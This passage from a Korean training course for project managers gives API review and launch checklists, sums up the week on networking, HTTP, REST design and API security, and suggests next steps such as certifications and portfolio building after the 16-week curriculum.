- [ ] 에러 처리가 적절한가?

**성능**:
- [ ] 응답 시간이 적절한가? (<300ms 목표)
- [ ] 대량 데이터 처리가 가능한가?
- [ ] 페이지네이션이 잘 작동하는가?

**보안**:
- [ ] 취약점 스캔을 했는가?
- [ ] 침투 테스트를 했는가?
- [ ] 보안 가이드를 따르는가?

**문서**:
- [ ] API 문서가 완전한가?
- [ ] 예제가 실제로 작동하는가?
- [ ] 변경 로그가 있는가?

**개발자 경험**:
- [ ] 에러 메시지가 명확한가?
- [ ] SDK가 제공되는가?
- [ ] 지원 채널이 있는가?

### 10.3 런칭 체크리스트

**런칭 1주 전**:
- [ ] 보안 점검 완료
- [ ] 성능 테스트 완료
- [ ] 문서 최종 검토
- [ ] 모니터링 설정
- [ ] 백업 계획 수립

**런칭 당일**:
- [ ] 트래픽 모니터링
- [ ] 에러율 체크
- [ ] 응답 시간 체크
- [ ] 온콜 대기

**런칭 1주 후**:
- [ ] 피드백 수집
- [ ] 사용 패턴 분석
- [ ] 개선점 도출
- [ ] 다음 버전 계획

---

## 🎓 과정 완료 및 다음 단계

### Week 16 핵심 요약

1. **네트워크 기초**: OSI 7계층, TCP/IP
2. **HTTP/HTTPS**: 상태 코드, 메서드
3. **REST API 설계**: RESTful 원칙, URL 설계
4. **API 문서화**: Swagger/OpenAPI
5. **보안**: 인증, 인가, Rate Limiting

### 16주 전체 과정 완료 축하! 🎉

**이제 할 수 있는 것**:
- ✅ 프로젝트 계획 수립
- ✅ 요구사항 분석 및 관리
- ✅ 일정 및 리소스 관리
- ✅ 리스크 관리
- ✅ 품질 관리
- ✅ 애자일 프로젝트 관리
- ✅ 이해관계자 관리
- ✅ 개발팀과의 기술 소통
- ✅ 클라우드 인프라 이해
- ✅ API 설계 검토

### 다음 단계

**1. 포트폴리오 구축**:
- 가상 프로젝트 2-3개
- GitHub에 문서 업로드
- 프로젝트 관리 사례 작성

**2. 자격증 준비**:
- PMP (Project Management Professional)
- CAPM (Certified Associate in Project Management)
- PSM (Professional Scrum Master)

**3. 실전 경험**:
- 오픈소스 프로젝트 PM 참여
- 스타트업 인턴십
- 프리랜서 PM 프로젝트

**4. 네트워킹**:
- PM 커뮤니티 가입
- 밋업 참석
- LinkedIn 프로필 강화

---

**강의 자료 버전**: 2.0  
**최종 업데이트**: 2026년 2월  
**작성자**: PM Expert Training Team  
**변경 사항**: REST API 설계, API 문서화, 보안 섹션 추가 (고급 콘텐츠 +10KB)

**전체 커리큘럼 완료! 축하합니다! 🎉🎉🎉**
